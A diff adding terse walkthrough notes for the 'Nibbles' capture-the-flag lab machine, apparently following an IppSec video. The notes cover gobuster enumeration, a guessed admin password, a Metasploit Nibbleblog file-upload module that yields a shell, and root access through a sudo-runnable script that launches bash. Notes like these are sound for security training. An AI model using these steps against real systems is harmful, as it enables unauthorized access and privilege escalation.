@@ -1,0 +1,15 @@
+//based on IppSec
+====== Nibbleblog ======
+Version: v4.0.3
+
+admin@nibbles.com
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.75/nibbleblog -x php	//or can download nibbleblog 4.0.3 and view the whole config, specially tree for interesting files
+/nibbleblog/content/private/users.xml	-> admin user
+http://10.10.10.75/nibbleblog/admin.php
+admin:nibbles				//guess
+multi/http/nibbleblog_file_upload	//metasploit,set rhost, targeturi(/nibbleblog), user, pass -> got shell
+sudo -l
+mkdir -p personal/stuff
+echo "#!/bin/bash" > monitor.sh
+echo "bash" >> monitor.sh
+sudo ./monitor.sh			//got root
